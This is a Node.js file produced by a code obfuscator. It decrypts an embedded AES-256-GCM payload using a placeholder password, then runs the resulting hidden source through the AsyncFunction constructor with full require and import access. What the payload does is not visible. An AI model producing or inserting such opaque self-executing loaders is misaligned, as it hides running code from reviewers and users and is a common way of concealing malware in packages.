// ╔══════════════════════════════════════════════════════╗
// ║  Obfuscationary by JusticeTech                      ║
// ║  Version  : 4.1.1                                     ║
// ║  Encrypted: 2026-07-25 08:52:13 UTC                   ║
// ║  Cipher   : PBKDF2+AES-256-GCM                        ║
// ║  Tamper   : Protected via SHA-256 integrity check    ║
// ╚══════════════════════════════════════════════════════╝

// Encrypted by Obfuscationary by JusticeTech v4.1.1
(async()=>{
  if(typeof require==='undefined')throw new Error('[Obfuscationary] Use Node.js.');
  const _b64='T0JGdjS34Acxp8fn7GjpDW50NuA9GelskGuKhAU2q/OWdcQ93eEStn7svHMgKboeJ/4UyUFfV6FfdeBOy5tRFykvhj4R+ORSs9mkWlfYjQuN3O2DN2cYZY9nWqwIU7EkdLRHFZxuNxxUcCqmxF3vBf+qPR7kVQmJn/tpzXHTxc23pslEpLGvvSSuqkGZfn10uwJg5Cnp0rbki1t60Dv1bzmc82OEJhal5BaN4AGm0d/2lRyTjfdOMecVwY3CrDw1pyopeps7dt4Jo8CnUSy4YgiSc9+j5DkEgXGRoIUmDi7mvftowjCKtFlb/sNhLsly9VvU4c3Q8XarnRCsZ+1Thb3HD2O7G/c9XS6gBNfznFX4KVCVLPBV3NBDVOq0o+DZ7cbqxKj+3in9kc/jvamlVjtVLujj6Q7Ox40lRkKNgqSRWvWpbUxKUALeHo5agxfowH1Gi1KXdj0MgtRwgvGLsmaqi28ygaij81EfVqXN0pT8GTtz/H23+Lcg1ELg6n14wSZTYfcpSBtuHwcmVWnRmtjh3A0qTXydyVHARKnk6mr9YvwFZSxnFpXXcBZ87g4VNcvfElIeViJXSLWxkp17tKT+YA5T6CHkvcMsIqn+Am3IPPL1TEVDPZCNnBJKeuHvRrA42vFznTcMTBd+slhlxOgYrjg2aE7sEjAOr6YiReZ2zKgSCBgI7ZVGxvMb79SIaYkkuXwOUM6XpCA3Tp4cWol6uF32TjUJqRNFIQdX03ASDMnpraXId+MsQ44hlzvRlUmnGYI0DpmpGunTj/nEjIxncSmtRSk5Gp7WABljCQbylL4rQ1ETYdFV8PzgQNK8T0fvEIjlbydkK5nJ7RTvkMZSNwcCLtXiFIVVCz6tp6IRIIrTDHRuFx0FJsJAFuGrf62qG33Xgd+lEzONBZfvxDJFw5IaHp413nUaWWYoDNPYtps+FHYohOEqrPX9tMM3';const _IH='c6451a0486e935c8c52d3819e2c27cbebd3ca4796460fede1363b9be691522c0';let _src;

  const _PWDS=["change_this_to_a_long_random_secret"];
  const _MAGIC="OBFv4";
  const _c2=require('crypto');
  const _ah=_c2.createHash('sha256').update(_b64).digest('hex');
  if(_ah!==_IH)throw new Error('[Obfuscationary] Tamper detected!');
  let _d=Buffer.from(_b64,'base64');
  for(let i=_PWDS.length-1;i>=0;i--){
    const pw=_PWDS[i];
    if(!_d.toString('utf8',0,5).startsWith(_MAGIC))throw new Error('[Obfuscationary] Bad header');
    const blob=_d.slice(5);
    const s=blob.slice(0,16), iv=blob.slice(16,28), ct=blob.slice(28);
    const kk=_c2.pbkdf2Sync(pw,s,100000,32,'sha256');
    const dc=_c2.createDecipheriv('aes-256-gcm',kk,iv);
    const tag=ct.slice(ct.length-16), cdata=ct.slice(0,ct.length-16);
    dc.setAuthTag(tag);
    _d=Buffer.concat([dc.update(cdata),dc.final()]);
  }
  _src=_d.toString('utf8');

  const _import=(m)=>import(m);
  const _F=Object.getPrototypeOf(async function(){}).constructor;
  await _F('module','exports','require','__filename','__dirname','_import',_src)(module,exports,require,__filename,__dirname,_import);
})();
